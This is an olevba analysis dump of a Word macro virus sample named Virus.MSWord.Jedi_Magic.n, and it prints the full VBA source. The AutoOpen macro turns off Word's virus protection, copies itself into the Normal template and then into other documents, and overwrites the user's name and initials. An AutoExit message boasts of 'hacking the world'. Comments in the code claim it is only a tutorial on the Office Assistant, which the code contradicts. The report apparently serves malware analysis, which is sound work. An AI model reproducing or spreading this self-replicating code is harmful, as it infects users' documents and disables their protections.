olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jedi_Magic.n
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Jedi_Magic.n - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Word_Module.bas 
in file: Virus.MSWord.Jedi_Magic.n - OLE stream: 'Macros/VBA/Word_Module'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






















Sub AutoOpen()
'Copyright 1999 by Peter-Paul D. Gumpal
'I created this module for a very special purpose, it is not
'that I want to get someone's attention but I just want to spread
'this code(not the virus), but the code on how to program the Office
'Assistant.  After learning the features of the office assistant
'I want other people to know also how to program the office
'assistant, it came free anyway in Microsoft Office! So please no
'modification for this module, I had copyrighted this so that just
'in case someone did modify MY code I have the right to take
'legal actions.
'
'Thank you for cooperating and I hope you will soon discover
'that the Office Assistant IS NOT SO ANNOYING!!!
On Error Resume Next
Options.VirusProtection = False
Dim bal As Balloon
Dim iRetVal As Integer


If Application.UserInitials <> "OBC" Then

 Set bal = Assistant.NewBalloon
 With bal
 .Heading = "I'm Peepo, I will be your office Assistant!"
 .BalloonType = msoBalloonTypeButtons
 .Button = msoButtonSetOK
 iRetVal = .Show
 End With
     Application.OrganizerCopy Source:= _
    ActiveDocument.FullName, Destination:= _
    NormalTemplate.FullName, Name:="Word_Module", _
    Object:=wdOrganizerObjectProjectItems
    NormalTemplate.Save
   Application.UserName = "Peepo Guwapings"
    Application.UserInitials = "PPG"
    Application.UserAddress = "From AMACC-QC"
End If
For Each aVar In ActiveDocument.Variables
    If aVar.Name = "Peepo" Then num = aVar.Index
Next aVar
If num = 0 Then
   Application.OrganizerCopy Source:= _
    NormalTemplate.FullName, Destination:= _
    ActiveDocument.FullName, Name:="Word_Module", _
    Object:=wdOrganizerObjectProjectItems
   ActiveDocument.Variables.Add Name:="Peepo", Value:="567374-Peepo Guwapings"
    ActiveDocument.Save
End If
On Error GoTo 0
End Sub
Sub AutoExit()
    Application.UserName = "Peepo G. of AMACC-QC"
    MsgBox "Peepo Guwapings - Hacking the world in style. [[=Gambit23=]]", vbInformation, "D' Tropang Durbab of Echague, Isabela"
End Sub






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
+----------+--------------------+---------------------------------------------+

